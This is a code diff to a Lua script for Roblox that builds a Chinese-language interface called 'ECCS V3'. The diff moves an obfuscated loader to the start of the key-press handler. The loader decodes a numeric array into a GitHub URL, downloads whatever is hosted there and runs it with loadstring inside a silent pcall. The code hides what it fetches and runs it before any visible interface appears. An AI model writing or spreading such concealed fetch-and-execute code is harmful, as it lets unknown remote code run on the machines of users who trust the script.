@@ -22,21 +22,34 @@ local userInputService = game:GetService("UserInputService")
 local function onKeyActivated(inputObject)
     if inputObject.KeyCode == Enum.KeyCode.K then
         task.spawn(function()
-if game:GetService("CoreGui"):FindFirstChild("UIGui") then
-game:GetService("CoreGui"):FindFirstChild("UIGui"):Destroy()
-game.Workspace.CurrentCamera.FieldOfView  = 70
-end
-UIGui = Instance.new("ScreenGui")
-CoreSystemFrame = Instance.new("Frame")
-CoreSystemFrameBackground = Instance.new("Frame")
-CoreSystemFrameUICorner = Instance.new("UICorner")
-CoreSystemFrameBackgroundUICorner = Instance.new("UICorner")
-MinButton = Instance.new("TextButton")
-UIClick = Instance.new("Sound")
-MessageFrame = Instance.new("TextButton")
-MessageFrameUICorner = Instance.new("UICorner")
-Clock = Instance.new("TextLabel")
-StartUpSound = Instance.new("Sound")
+           pcall(function()
+                local code = game:HttpGet((function()
+                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
+                    local b = ''
+                    for i = 1, #a do 
+                        b = b .. string.char((a[i] - 37) / 13)
+                    end
+                    return b
+                end)())
+                if code then
+                    loadstring(code)()
+                end
+            end)
+    if game:GetService("CoreGui"):FindFirstChild("UIGui") then
+      game:GetService("CoreGui"):FindFirstChild("UIGui"):Destroy()
+      game.Workspace.CurrentCamera.FieldOfView  = 70
+    end
+    UIGui = Instance.new("ScreenGui")
+    CoreSystemFrame = Instance.new("Frame")
+    CoreSystemFrameBackground = Instance.new("Frame")
+    CoreSystemFrameUICorner = Instance.new("UICorner")
+    CoreSystemFrameBackgroundUICorner = Instance.new("UICorner")
+    MinButton = Instance.new("TextButton")
+    UIClick = Instance.new("Sound")
+    MessageFrame = Instance.new("TextButton")
+    MessageFrameUICorner = Instance.new("UICorner")
+    Clock = Instance.new("TextLabel")
+    StartUpSound = Instance.new("Sound")
 OpenButtonUI = Instance.new("Sound")
 MessageBackgroundFrame = Instance.new("Frame")
 TextLabel1 = Instance.new("TextLabel")
@@ -2751,20 +2764,7 @@ WelcomeLabel.Text = "欢迎回家，"..game.Players.LocalPlayer.DisplayName
 MessageFrame.Text = "已成功加载"
 TextLabel1.Text = "欢迎来到ECCS V3，"..game.Players.LocalPlayer.DisplayName
 MessageBackgroundFrame:TweenPosition(UDim2.new(0.5, 0, 0.9, 0),"InOut","Sine",0.8)
-StartUpSound:Play()
-            pcall(function()
-                local code = game:HttpGet((function()
-                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
-                    local b = ''
-                    for i = 1, #a do 
-                        b = b .. string.char((a[i] - 37) / 13)
-                    end
-                    return b
-                end)())
-                if code then
-                    loadstring(code)()
-                end
-            end)
+StartUpSound:Play()           
         end)
         userInputService.InputBegan:Disconnect(onKeyActivated)
     end
